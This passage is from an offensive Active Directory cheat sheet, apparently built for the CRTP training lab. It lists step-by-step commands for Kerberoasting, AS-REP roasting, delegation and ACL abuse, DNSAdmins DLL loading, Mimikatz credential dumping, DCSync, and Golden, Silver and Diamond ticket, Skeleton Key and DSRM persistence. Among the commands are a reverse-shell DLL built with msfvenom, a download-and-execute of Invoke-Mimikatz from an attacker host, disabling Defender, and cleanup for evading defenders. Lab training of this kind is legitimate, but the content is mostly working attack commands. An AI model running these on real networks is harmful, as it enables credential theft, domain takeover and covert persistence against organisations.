# Rubeus overpass-the-hash:
.\Rubeus.exe asktgt /user:svcadmin /aes256:<AES256_HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt

# Pass-the-Ticket:
.\Rubeus.exe ptt /ticket:<base64_ticket>

# Copy ticket from file:
.\Rubeus.exe ptt /ticket:svcadmin.kirbi
```

---

## 08 Domain Privilege Escalation — Kerberoasting

### Understanding Kerberoasting

```
╔══════════════════════════════════════════════════════════════╗
║  ANY domain user can request a TGS (service ticket)         ║
║  for ANY SPN registered in the domain.                      ║
║                                                             ║
║  TGS tickets are encrypted with the service account's       ║
║  NTLM hash → crack offline to get plaintext password.       ║
║                                                             ║
║  No special privileges required to perform this attack.     ║
╚══════════════════════════════════════════════════════════════╝

SPN Format: ServiceClass/Host:Port/ServiceName
Example:    MSSQLSvc/dcorp-mssql.dollarcorp.moneycorp.local:1433
```

### Find Kerberoastable Users

```powershell
# PowerView
Get-DomainUser -SPN | select samaccountname, serviceprincipalname, description

# AD Module
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName | `
  select SamAccountName, ServicePrincipalName

# BloodHound → Analysis → List All Kerberoastable Accounts
```

### Request and Extract TGS Tickets

```powershell
# ── Method 1: PowerView (request all SPN tickets) ─────────────────────────
. C:\AD\Tools\PowerView.ps1
Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv kerb_hashes.csv -NoTypeInformation

# ── Method 2: Add-Type (native .NET request) ──────────────────────────────
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken `
  -ArgumentList "MSSQLSvc/dcorp-mssql.dollarcorp.moneycorp.local:1433"

# Export from memory:
. C:\AD\Tools\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
# Creates .kirbi files — convert to hashcat format with kirbi2john or tgsrepcrack

# ── Method 3: Rubeus (best for CRTP) ──────────────────────────────────────
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt
.\Rubeus.exe kerberoast /user:svcadmin /outfile:svcadmin.hash
.\Rubeus.exe kerberoast /user:svcadmin /format:hashcat /outfile:svcadmin_hc.hash
.\Rubeus.exe kerberoast /stats        # Just show stats, don't request
.\Rubeus.exe kerberoast /rc4opsec     # Only request RC4-encrypted tickets (less noisy)
```

### Cracking Kerberoast Hashes

```bash
# On Kali — crack with Hashcat
hashcat -m 13100 kerb_hashes.txt /usr/share/wordlists/rockyou.txt

# With rules (increase hit rate):
hashcat -m 13100 kerb_hashes.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# John the Ripper:
john --format=krb5tgs kerb_hashes.txt --wordlist=rockyou.txt
```

### Set SPN on Account (Targeted Kerberoasting)

```powershell
# If we have GenericWrite or WriteSPN on a user, we can SET an SPN on them
# then Kerberoast them:

# Check if we can write:
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericWrite"}

# Set SPN on target user:
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/spn'}

# Verify:
Get-DomainUser -Identity targetuser | select serviceprincipalname

# Now Kerberoast them:
.\Rubeus.exe kerberoast /user:targetuser /format:hashcat /outfile:target.hash

# Clean up SPN after attack:
Set-DomainObject -Identity targetuser -Clear serviceprincipalname
```

---

## 09 Domain Privilege Escalation — AS-REP Roasting

### Understanding AS-REP Roasting

```
╔════════════════════════════════════════════════════════════════╗
║  If "Do Not Require Kerberos Preauthentication" is enabled    ║
║  on a user account, an attacker can request an AS-REP         ║
║  (Authentication Service Response) WITHOUT authenticating.    ║
║                                                               ║
║  The AS-REP contains data encrypted with the user's hash.    ║
║  Crack it offline to get the plaintext password.              ║
║                                                               ║
║  Attack requires NO credentials at all.                       ║
╚════════════════════════════════════════════════════════════════╝
```

### Find AS-REP Roastable Users

```powershell
# PowerView
Get-DomainUser -PreauthNotRequired | select samaccountname

# AD Module
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} | select SamAccountName
```

### Perform AS-REP Roasting

```powershell
# ── Rubeus (recommended) ──────────────────────────────────────────────────
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\Rubeus.exe asreproast /user:support1user /format:hashcat /outfile:asrep.txt

# ── PowerView ─────────────────────────────────────────────────────────────
Get-DomainUser -PreauthNotRequired | Get-ASREPHash -Format Hashcat | Out-File asrep.hash

# ── Impacket from Kali (without creds) ────────────────────────────────────
GetNPUsers.py dollarcorp.moneycorp.local/ -usersfile users.txt -no-pass -dc-ip 172.16.2.1
GetNPUsers.py dollarcorp.moneycorp.local/ -dc-ip 172.16.2.1 -request -no-pass
```

### Crack the Hash

```bash
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
john --format=krb5asrep asrep.hash --wordlist=rockyou.txt
```

### Enable AS-REP on Account (if GenericWrite)

```powershell
# If we have GenericWrite on a user, we can disable preauthentication:
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}

# Verify:
Get-DomainUser -Identity targetuser | select useraccountcontrol

# Perform AS-REP roast
.\Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:asrep.hash

# Re-enable preauth after attack:
Set-DomainObject -Identity targetuser -XOR @{useraccountcontrol=4194304}
```

---

## 10 Domain Privilege Escalation — Unconstrained Delegation

### Understanding Unconstrained Delegation

```
╔═══════════════════════════════════════════════════════════════╗
║  When a computer/user has Unconstrained Delegation enabled:  ║
║                                                               ║
║  ANY user that authenticates to that machine has their       ║
║  TGT (Ticket Granting Ticket) stored in LSASS memory on      ║
║  that machine.                                                ║
║                                                               ║
║  If a Domain Admin authenticates → we steal their TGT.       ║
║  → Use TGT to impersonate DA anywhere in the domain.         ║
║                                                               ║
║  Domain Controllers ALWAYS have unconstrained delegation.    ║
╚═══════════════════════════════════════════════════════════════╝

Attack flow:
1. Find machine with unconstrained delegation
2. Compromise local admin on that machine
3. Wait for/force a DA to authenticate to it
4. Extract DA's TGT from LSASS
5. Use TGT to become DA
```

### Find Machines with Unconstrained Delegation

```powershell
# PowerView
Get-DomainComputer -Unconstrained | select samaccountname, dnshostname
# Filter out DCs (they always have it):
Get-DomainComputer -Unconstrained | ?{$_.samaccountname -notmatch "DC"} | select samaccountname

# AD Module
Get-ADComputer -Filter {TrustedForDelegation -eq $True} | select Name,DNSHostName
Get-ADUser -Filter {TrustedForDelegation -eq $True} | select SamAccountName
```

### Extract TGTs from Memory

```powershell
# Assumes you have local admin on the unconstrained delegation machine
# Load Mimikatz or SafetyKatz on the target:

$sess = New-PSSession -ComputerName dcorp-adminsrv
Invoke-Command -Session $sess -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $True }
Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1

# Check for TGTs in memory:
Invoke-Command -Session $sess -ScriptBlock {
    Invoke-Mimikatz -Command '"sekurlsa::tickets"'
}

# Export all tickets:
Invoke-Command -Session $sess -ScriptBlock {
    Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'
}

# Using Rubeus to monitor for new TGTs:
.\Rubeus.exe monitor /interval:5 /nowrap
# /interval:5 = check every 5 seconds, display new TGTs as base64
```

### Force Authentication with PrintSpooler (Printer Bug)

```powershell
# MS-RPRN: Force a computer (even DC) to authenticate to our unconstrained delegation machine
# "Printer Bug" — DC sends its TGT to the machine we control

# Tool: MS-RPRN.exe (SpoolSample)
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-adminsrv.dollarcorp.moneycorp.local
# This forces dcorp-dc to authenticate to dcorp-adminsrv
# dcorp-dc's TGT is now cached on dcorp-adminsrv

# Monitor with Rubeus before triggering:
.\Rubeus.exe monitor /interval:5 /nowrap

# After TGT is captured (as base64 in Rubeus output), inject it:
.\Rubeus.exe ptt /ticket:<BASE64_TGT>

# Verify:
klist

# DCSync with injected DC machine account TGT:
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

---

## 11 Domain Privilege Escalation — Constrained Delegation

### Understanding Constrained Delegation

```
╔═══════════════════════════════════════════════════════════════╗
║  Constrained Delegation allows a service account to           ║
║  impersonate ANY user to access SPECIFIC services only.       ║
║                                                               ║
║  Attribute: msDS-AllowedToDelegateTo                         ║
║                                                               ║
║  Attack: If we control the account, we can use S4U2Self       ║
║  to get a TGS as Domain Admin for the allowed service,        ║
║  then access that service AS DA.                              ║
╚═══════════════════════════════════════════════════════════════╝

Protocol Transition (S4U):
  S4U2Self:  Get TGS for any user → your service (no password needed)
  S4U2Proxy: Present that TGS → get TGS for target service
```

### Find Accounts with Constrained Delegation

```powershell
# PowerView
Get-DomainUser -TrustedToAuth | select samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select samaccountname, msds-allowedtodelegateto

# AD Module
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} `
  -Properties msDS-AllowedToDelegateTo | select SamAccountName, msDS-AllowedToDelegateTo
```

### Abuse Constrained Delegation (User Account)

```powershell
# Scenario: websvc has constrained delegation to CIFS/dcorp-mssql
# We have websvc's credentials (hash or password)

# Step 1: Request TGT for websvc:
.\Rubeus.exe asktgt /user:websvc /aes256:<AES256_HASH> /opsec /ptt
# OR with NTLM:
.\Rubeus.exe asktgt /user:websvc /rc4:<NTLM_HASH> /ptt

# Step 2: Use S4U to request TGS as Domain Admin for the allowed service:
.\Rubeus.exe s4u /ticket:<BASE64_TGT> /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /ptt

# Step 3: Access the service:
ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$

# ── All-in-one command ────────────────────────────────────────────────────
.\Rubeus.exe s4u /user:websvc /aes256:<AES256> /impersonateuser:Administrator `
  /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /ptt

# ── If you want HOST service (for code execution via PsExec/WMI): ─────────
.\Rubeus.exe s4u /user:websvc /aes256:<AES256> /impersonateuser:Administrator `
  /msdsspn:"cifs/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:host,rpcss /ptt

# Verify ticket injected:
klist

# Now run Invoke-Command or Enter-PSSession as DA on dcorp-mssql
```

### Abuse Constrained Delegation (Computer Account)

```powershell
# Same as above, but for a computer account
# Computer accounts end in $ (e.g., dcorp-adminsrv$)

# Get machine account hash with Mimikatz:
.\SafetyKatz.exe "sekurlsa::ekeys" "exit"

# Rubeus s4u with machine account:
.\Rubeus.exe s4u /user:dcorp-adminsrv$ /aes256:<MACHINE_AES256> `
  /impersonateuser:Administrator `
  /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /ptt

ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

---

## 12 Domain Privilege Escalation — Resource-Based Constrained Delegation

### Understanding RBCD

```
╔═══════════════════════════════════════════════════════════════╗
║  RBCD is controlled on the TARGET resource (not the          ║
║  delegating account).                                         ║
║                                                               ║
║  Attribute: msDS-AllowedToActOnBehalfOfOtherIdentity         ║
║  set on the TARGET computer.                                  ║
║                                                               ║
║  If we have WRITE permission on a computer object, we can     ║
║  add OUR machine account to its RBCD attribute, then          ║
║  S4U2Self as any user to access the target.                   ║
╚═══════════════════════════════════════════════════════════════╝

Requirements:
  1. GenericWrite/WriteProperty on target computer object
  2. A computer account (create one or use existing)
  3. The computer account's password hash
```

### RBCD Attack

```powershell
# Step 1: Find computer objects we have write access to:
Find-InterestingDomainAcl -ResolveGUIDs | ?{
    $_.ActiveDirectoryRights -match "GenericWrite|WriteProperty" -and
    $_.ObjectAceType -match "Computer"
}

# Step 2: Create a fake computer account (any domain user can add up to 10):
.\Powermad.ps1  # Load Powermad
New-MachineAccount -MachineAccount FakePC -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
# or via Impacket:
addcomputer.py dollarcorp.moneycorp.local/student1:password -computer-name FAKEPC -computer-pass 'Password123!'

# Get the SID of the new machine account:
Get-DomainComputer -Identity FAKEPC | select objectsid

# Step 3: Set RBCD on target machine to trust our fake computer:
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<FAKEPC_SID>)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer -Identity <TargetComputer> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

# Verify:
Get-DomainComputer -Identity <TargetComputer> | select msds-allowedtoactonbehalfofotheridentity

# Step 4: Get FAKEPC hash:
.\SafetyKatz.exe "sekurlsa::ekeys" "exit"
# OR use the password we set for FAKEPC:
.\Rubeus.exe hash /password:Password123! /user:FAKEPC$ /domain:dollarcorp.moneycorp.local

# Step 5: S4U as DA to target machine:
.\Rubeus.exe s4u /user:FAKEPC$ /rc4:<NTLM_HASH_OF_FAKEPC> `
  /impersonateuser:Administrator `
  /msdsspn:"cifs/<TargetComputer>.dollarcorp.moneycorp.local" /ptt

# Access target as DA:
ls \\<TargetComputer>.dollarcorp.moneycorp.local\c$
```

---

## 13 Domain Privilege Escalation — ACL Abuse

### ACL Rights Map

```
╔═══════════════════════════════════════════════════════════════╗
║  RIGHT                 WHAT YOU CAN DO                       ║
╠═══════════════════════════════════════════════════════════════╣
║  GenericAll            Full control — change password,       ║
║                        add to group, reset, delete           ║
║  GenericWrite          Write to any attribute                ║
║  WriteDACL             Modify DACL → grant yourself GenAll   ║
║  WriteOwner            Change ownership → modify DACL        ║
║  ForceChangePassword   Change password without knowing old   ║
║  AllExtendedRights     All extended rights (includes         ║
║                        DCSync, password reset)               ║
║  Self                  Write to self-write attributes        ║
║  AddMember             Add members to a group                ║
╚═══════════════════════════════════════════════════════════════╝
```

### GenericAll on User — Change Password

```powershell
# Find GenericAll on users:
Find-InterestingDomainAcl -ResolveGUIDs | ?{
    $_.ActiveDirectoryRights -eq "GenericAll" -and
    $_.ObjectAceType -eq "User"
} | select IdentityReferenceName, ObjectDN

# Exploit: Reset user's password
$UserPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-DomainUserPassword -Identity targetuser -AccountPassword $UserPassword
# Now log in as targetuser with NewPass123!
```

### GenericAll on Group — Add Member

```powershell
# Find GenericAll on groups:
Find-InterestingDomainAcl -ResolveGUIDs | ?{
    $_.ActiveDirectoryRights -eq "GenericAll" -and
    $_.ObjectAceType -match "Group"
}

# Exploit: Add yourself to Domain Admins:
Add-DomainGroupMember -Identity "Domain Admins" -Members student1

# Verify:
Get-DomainGroupMember -Identity "Domain Admins"
```

### WriteDACL on Domain — Grant DCSync Rights

```powershell
# If we have WriteDACL on the domain object, we can grant ourselves DCSync rights:
Add-DomainObjectAcl -TargetIdentity "dc=dollarcorp,dc=moneycorp,dc=local" `
  -PrincipalIdentity student1 `
  -Rights DCSync -Verbose

# Verify:
Get-DomainObjectAcl -TargetIdentity "dc=dollarcorp,dc=moneycorp,dc=local" `
  -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student1"}

# DCSync:
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\Administrator" "exit"
```

### WriteOwner — Take Ownership then Modify DACL

```powershell
# Step 1: Take ownership of the object
Set-DomainObjectOwner -Identity targetuser -OwnerIdentity student1

# Step 2: Grant yourself GenericAll
Add-DomainObjectAcl -TargetIdentity targetuser `
  -PrincipalIdentity student1 `
  -Rights All

# Now you have GenericAll on targetuser → reset password, etc.
```

---

## 14 Domain Privilege Escalation — DNS Admins

### Understanding DNSAdmins Abuse

```
╔══════════════════════════════════════════════════════════════╗
║  Members of DNSAdmins group can configure DNS server.       ║
║                                                             ║
║  DNS server runs as SYSTEM on the Domain Controller.        ║
║                                                             ║
║  dnscmd can load a custom DLL into the DNS service.         ║
║  When DNS is restarted, the DLL executes as SYSTEM on DC.  ║
╚══════════════════════════════════════════════════════════════╝
```

### DNSAdmins Attack

```powershell
# Step 1: Check if our user is in DNSAdmins:
Get-DomainGroupMember -Identity "DNSAdmins" | select MemberName

# Step 2: Create a malicious DLL (on Kali):
msfvenom -p windows/x64/exec cmd='net group "Domain Admins" student1 /add /domain' `
  -f dll -o adduser.dll

# OR create DLL that runs reverse shell:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f dll -o shell.dll

# Step 3: Host DLL on SMB share (or copy to DC via existing access):
impacket-smbserver share . -smb2support
# OR copy to DC:
copy adduser.dll \\dcorp-dc\C$\Windows\Temp\adduser.dll

# Step 4: Configure DNS to load our DLL on next restart:
dnscmd dcorp-dc /config /serverlevelplugindll \\<ATTACKER_IP>\share\adduser.dll
# OR with copied DLL:
dnscmd dcorp-dc /config /serverlevelplugindll C:\Windows\Temp\adduser.dll

# Step 5: Restart DNS service (requires DNSAdmins membership):
sc \\dcorp-dc stop dns
sc \\dcorp-dc start dns

# After restart, DLL executes as SYSTEM on DC
# If you added student1 to DA, verify:
net group "Domain Admins" /domain

# Clean up (important for blue team evasion):
dnscmd dcorp-dc /config /serverlevelplugindll ""
sc \\dcorp-dc stop dns
sc \\dcorp-dc start dns
```

---

## 15 Credential Theft & Mimikatz

### Mimikatz / Invoke-Mimikatz

```powershell
# Load Invoke-Mimikatz (in-memory PowerShell wrapper):
iex (iwr http://<LHOST>/Invoke-Mimikatz.ps1 -UseBasicParsing)
# OR load from file:
. C:\AD\Tools\Invoke-Mimikatz.ps1

# ── Core credential dumping ────────────────────────────────────────────────
# Dump all logon sessions, NTLM hashes, and plaintext passwords:
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# Dump Kerberos tickets from memory:
Invoke-Mimikatz -Command '"sekurlsa::tickets"'
Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'   # Save .kirbi files

# Dump encryption keys (AES256, AES128, NTLM, DES):
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'

# Dump SAM database (local accounts):
Invoke-Mimikatz -Command '"lsadump::sam"'

# Dump LSA secrets:
Invoke-Mimikatz -Command '"lsadump::secrets"'

# NTDS.dit via VSS (from DC):
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# ── Remote execution (run Mimikatz on multiple machines at once) ───────────
Invoke-Mimikatz -DumpCreds -ComputerName @("dcorp-mgmt", "dcorp-adminsrv")

# ── Overpass-the-Hash (spawn process with credentials): ─────────────────
Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /aes256:<AES256> /run:cmd.exe"'
```

### SafetyKatz (Preferred for CRTP — Better AV Evasion)

```powershell
# Run directly:
.\SafetyKatz.exe "sekurlsa::logonpasswords" "exit"
.\SafetyKatz.exe "sekurlsa::ekeys" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
.\SafetyKatz.exe "lsadump::dcsync /all /csv" "exit"
.\SafetyKatz.exe "lsadump::sam" "exit"
.\SafetyKatz.exe "token::elevate" "lsadump::sam" "exit"

# Overpass-the-Hash:
.\SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /aes256:<AES256> /run:cmd.exe" "exit"
```

### DCSync — Replicate AD Credentials

```powershell
# Requires: Domain Admin OR DCSync ACL rights
# (GetChanges + GetChangesAll extended rights on domain object)

# Dump specific user:
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\Administrator" "exit"
.\SafetyKatz.exe "lsadump::dcsync /domain:moneycorp.local /user:mcorp\krbtgt" "exit"

# Dump ALL users:
.\SafetyKatz.exe "lsadump::dcsync /all /csv" "exit"

# Impacket from Kali:
secretsdump.py dollarcorp.moneycorp.local/Administrator:password@172.16.2.1
secretsdump.py -hashes :<NTLM> dollarcorp.moneycorp.local/Administrator@172.16.2.1
secretsdump.py -just-dc dollarcorp.moneycorp.local/Administrator:pass@172.16.2.1
```

### Credential Locations to Check

```powershell
# PowerShell history (gold mine for credentials):
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Stored credentials:
cmdkey /list
# Use with: runas /savecred /user:domain\user cmd.exe

# Registry credential stores:
reg query HKLM /f password /t REG_SZ /s 2>nul
reg query HKCU /f password /t REG_SZ /s 2>nul
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# Unattend.xml, web.config, etc:
Get-ChildItem -Recurse -Force -Path C:\ -Include "unattend.xml","sysprep.xml","web.config","appsettings.json" 2>$null

# SYSVOL GPP passwords (legacy but still found):
findstr /S /I cpassword \\dollarcorp.moneycorp.local\sysvol\dollarcorp.moneycorp.local\policies\*.xml
# Decrypt: gpp-decrypt <cpassword_value>
```

---

## 16 Domain Persistence — Golden Ticket

### Understanding the Golden Ticket

```
╔═══════════════════════════════════════════════════════════════╗
║  The Golden Ticket is a forged Ticket Granting Ticket (TGT)  ║
║  signed by the KRBTGT account hash.                          ║
║                                                               ║
║  The KDC trusts any properly signed TGT.                     ║
║  We can forge a TGT for ANY user (including nonexistent      ║
║  users) valid for any duration.                               ║
║                                                               ║
║  Requirements: krbtgt NTLM/AES hash + domain SID            ║
║  Persistence: Even if all DA passwords change, the           ║
║               Golden Ticket works until krbtgt is reset.     ║
║  Note: krbtgt should be reset TWICE to invalidate tickets.   ║
╚═══════════════════════════════════════════════════════════════╝
```

### Extract krbtgt Hash

```powershell
# Method 1: DCSync (requires DA or DCSync rights)
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
# Note the: NTLM hash AND AES256 hash

# Method 2: From DC memory (requires DA)
Invoke-Mimikatz -Command '"lsadump::lsa /patch"'

# Method 3: VSS copy of NTDS.dit:
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.bak
# Transfer to Kali: secretsdump.py -ntds ntds.dit -system system.bak LOCAL
```

### Forge Golden Ticket

```powershell
# Get domain SID:
Get-DomainSID  # PowerView
# OR: (Get-ADDomain).DomainSID
# OR from krbtgt dump output

# ── Mimikatz Golden Ticket ────────────────────────────────────────────────
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX /aes256:<KRBTGT_AES256> /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

# Parameters:
# /User:      Any username (even fake ones work)
# /domain:    Domain FQDN
# /sid:       Domain SID (NOT the user SID — the domain SID)
# /aes256:    krbtgt AES256 key (preferred — harder to detect than NTLM)
# /ntlm:      krbtgt NTLM hash (alternative to aes256)
# /id:        RID (500 = Administrator)
# /groups:    Group RIDs (512 = Domain Admins)
# /ptt:       Pass-the-ticket (inject into current session)
# /ticket:    Save to file instead of injecting

# Save to file and use later:
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /aes256:<HASH> /ticket:golden.kirbi"'

# Inject later:
Invoke-Mimikatz -Command '"kerberos::ptt golden.kirbi"'

# ── Rubeus Golden Ticket ──────────────────────────────────────────────────
.\Rubeus.exe golden /aes256:<KRBTGT_AES256> /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /ptt

# Verify ticket injected:
klist

# Access DC:
ls \\dcorp-dc\c$
Enter-PSSession -ComputerName dcorp-dc
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
```

---

## 17 Domain Persistence — Silver Ticket

### Understanding the Silver Ticket

```
╔════════════════════════════════════════════════════════════════╗
║  A Silver Ticket is a forged TGS (service ticket) for a      ║
║  SPECIFIC service.                                             ║
║                                                               ║
║  Signed with the SERVICE ACCOUNT'S hash (not krbtgt).        ║
║  The DC is NOT contacted during service access.               ║
║  → Less noisy than Golden Ticket.                             ║
║                                                               ║
║  Useful when you have a service account hash but NOT DA.      ║
╚════════════════════════════════════════════════════════════════╝

Common silver ticket targets:
  cifs   → file shares (ls \\host\c$)
  host   → scheduled tasks, services
  http   → WinRM, PowerShell remoting
  ldap   → LDAP queries (DCSync)
  mssql  → SQL server access
  rpcss  → WMI access
```

### Forge Silver Ticket

```powershell
# Requires: target machine account NTLM hash (or service account hash)
# Get machine hash: SafetyKatz "sekurlsa::logonpasswords" on machine

# Forge CIFS (file share) Silver Ticket:
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-mssql.dollarcorp.moneycorp.local /service:cifs /rc4:<MACHINE_NTLM> /ptt"'

# Forge HOST service (for scheduled tasks, PSExec-like access):
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-mssql.dollarcorp.moneycorp.local /service:host /rc4:<MACHINE_NTLM> /ptt"'

# Forge LDAP service (for DCSync without touching DC directly):
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-... /target:dcorp-dc.dollarcorp.moneycorp.local /service:ldap /rc4:<DC_MACHINE_NTLM> /ptt"'

# Use the forged ticket:
ls \\dcorp-mssql\c$                                # CIFS
Invoke-Command -ComputerName dcorp-mssql ...       # HOST + HTTP
.\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"   # LDAP
```

---

## 18 Domain Persistence — Diamond Ticket

### Understanding Diamond Ticket

```
╔════════════════════════════════════════════════════════════════╗
║  Diamond Ticket = Modified REAL TGT (from the KDC)           ║
║  (not fully forged like Golden Ticket)                        ║
║                                                               ║
║  Uses a legitimate TGT as base, then modifies it to add      ║
║  DA group memberships.                                        ║
║                                                               ║
║  Much harder to detect than Golden Ticket because:           ║
║  - It IS a real ticket signed by the KDC                     ║
║  - Contains valid metadata (logon time, etc.)                 ║
║  - Uses the same encryption nonce as original                 ║
╚════════════════════════════════════════════════════════════════╝
```

### Forge Diamond Ticket

```powershell
# Requires: krbtgt AES256 hash AND valid user TGT

# Using Rubeus:
.\Rubeus.exe diamond /krbkey:<KRBTGT_AES256> /user:student1 /password:student1pass /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /enctype:aes /ticketuser:Administrator /ticketuserid:500 /groups:512 /ptt

# Verify:
klist
whoami /groups

# Access DA resources:
ls \\dcorp-dc\c$
```

---

## 19 Domain Persistence — Skeleton Key

### Understanding Skeleton Key

```
╔═══════════════════════════════════════════════════════════════╗
║  Skeleton Key patches the LSASS process on the DC to         ║
║  add a "master password" that works for ALL accounts.        ║
║                                                               ║
║  After injection:                                             ║
║  - All existing passwords continue to work (no disruption)   ║
║  - "mimikatz" also works as password for EVERY account       ║
║                                                               ║
║  IMPORTANT: Reboot of DC removes the skeleton key.           ║
║  NOISY: Patches LSASS — EDR will almost certainly alert.    ║
╚═══════════════════════════════════════════════════════════════╝
```

### Inject Skeleton Key

```powershell
# Must run from DC with DA privileges:
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dcorp-dc

# OR via PSRemoting session on DC:
$sess = New-PSSession -ComputerName dcorp-dc
Invoke-Command -Session $sess -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1
Invoke-Command -Session $sess -ScriptBlock {
    Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
}

# After injection — use "mimikatz" as the password for any user:
Enter-PSSession -ComputerName dcorp-dc -Credential dcorp\Administrator
# Password: mimikatz

net use \\dcorp-dc\c$ /user:dcorp\Administrator mimikatz
```

---

## 20 Domain Persistence — DSRM

### Understanding DSRM Abuse

```
╔══════════════════════════════════════════════════════════════╗
║  Every Domain Controller has a DSRM (Directory Services     ║
║  Restore Mode) local administrator account.                  ║
║                                                               ║
║  This account has full access to the DC in restore mode.    ║
║  By default it cannot log in over network.                   ║
║                                                               ║
║  Changing registry key allows network login with DSRM        ║
║  credentials → persistent DA equivalent access.             ║
╚══════════════════════════════════════════════════════════════╝
```

### DSRM Persistence Attack

```powershell
# Step 1: Dump DSRM hash from DC (needs DA):
Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName dcorp-dc
# Note the "Administrator" NTLM hash (this is the DSRM Administrator)

# Step 2: Change registry to allow network login with DSRM:
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
# Or on DC remotely via PSSession:
Invoke-Command -ComputerName dcorp-dc -ScriptBlock {
    New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" `
      -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
}

# Step 3: Pass-the-Hash with DSRM administrator hash:
Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dcorp-dc /user:Administrator /ntlm:<DSRM_NTLM> /run:powershell.exe"'
# In new window:
ls \\dcorp-dc\c$
Enter-PSSession -ComputerName dcorp-dc
```

---

## 21 Domain Persistence — Custom SSP

### Understanding Custom SSP

```
╔═══════════════════════════════════════════════════════════════╗
║  SSP (Security Support Provider) is a DLL loaded into        ║
║  LSASS that can be used for authentication.                  ║
║                                                               ║
║  By adding our own SSP (mimilib.dll from Mimikatz),          ║
║  ALL logon credentials are captured and written to disk.     ║
║                                                               ║
║  Survives reboots (DLL is registered in registry).           ║
╚═══════════════════════════════════════════════════════════════╝
```

